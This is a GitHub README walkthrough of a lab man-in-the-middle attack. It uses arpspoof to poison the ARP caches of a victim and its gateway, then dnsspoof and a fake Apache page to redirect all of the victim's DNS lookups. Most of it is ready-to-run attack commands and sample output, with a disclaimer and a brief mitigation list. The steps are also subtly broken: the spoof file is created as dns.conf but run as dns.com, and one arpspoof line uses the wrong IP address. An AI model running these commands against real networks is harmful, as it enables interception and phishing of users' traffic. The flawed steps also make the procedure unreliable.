# DNS-Spoofing-Attack-Walkthrough

 📌 Introduction
This project demonstrates a **Man-in-the-Middle (MITM) attack using ARP spoofing and DNS spoofing** on a local network.  
The attacker (Kali Linux) poisons the ARP cache of both the **victim (Windows 7)** and the **gateway (router)**, intercepts DNS requests, and redirects them to a fake website hosted on the attacker machine using **Apache2**.  

⚠️ **Disclaimer**: This project is for **educational purposes only** in a controlled lab environment. Do not attempt on real networks.  

---

## 🖥️ Lab Setup
- **Attacker**: Kali Linux  
- **Victim**: Windows 7  
- **Gateway/Router** 
- **Network**: VMware/VirtualBox Host-only or NAT  

---

## ⚙️ Steps

### 1. Enable IP Forwarding

echo 1 > /proc/sys/net/ipv4/ip_forward

This allows Kali to forward traffic between victim and gateway.

---

2. ARP Spoofing

Poison victim’s ARP table (tell victim that attacker = router):

arpspoof -i eth0 -t 192.168.152.8 192.168.152.2


Poison router’s ARP table (tell router that attacker = victim):

arpspoof -i eth0 -t 192.168.152.2 192.168.152.50

---

3. Set Up Fake Website

Start Apache2 web server:

service apache2 start


Place your fake page inside:

/var/www/html/index.html

---

4. Create DNS Spoof File

Create dns.conf file in your home directory:

192.168.152.50    *


This redirects all DNS requests to attacker’s IP.

5. Run DNS Spoof
   
dnsspoof -i eth0 -f dns.com


📸 Example Output:

dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.152.50]

---

6. Victim Browsing

When the victim (Win7) visits any website, DNS request is spoofed → redirected to attacker’s web server.

---

📝 Results

Victim’s traffic successfully redirected.

Attacker controls DNS resolution.

Fake webpage displayed to victim.

---

🔒 Mitigation

Use HTTPS with DNSSEC

Enable static ARP entries

Use IDS/IPS tools like Snort

Avoid untrusted networks

---

📷 Screenshots

ARP Spoof terminal → [Arpspoof1.png](https://github.com/vaibhavkhare45/-DNS-Spoofing-Attack-Walkthrough/blob/main/Arpspoof1.png) , [arpspoof2.png](https://github.com/vaibhavkhare45/-DNS-Spoofing-Attack-Walkthrough/blob/main/arpspoof2.png)

DNS Spoof terminal → [dnsspoof.png](https://github.com/vaibhavkhare45/-DNS-Spoofing-Attack-Walkthrough/blob/main/dnsspoof.png)

Apache running → [apache.png](https://github.com/vaibhavkhare45/-DNS-Spoofing-Attack-Walkthrough/blob/main/apache.png)

Victim spoofed webpage → [victim_browser.png](https://github.com/vaibhavkhare45/-DNS-Spoofing-Attack-Walkthrough/blob/main/victim_browser.png)
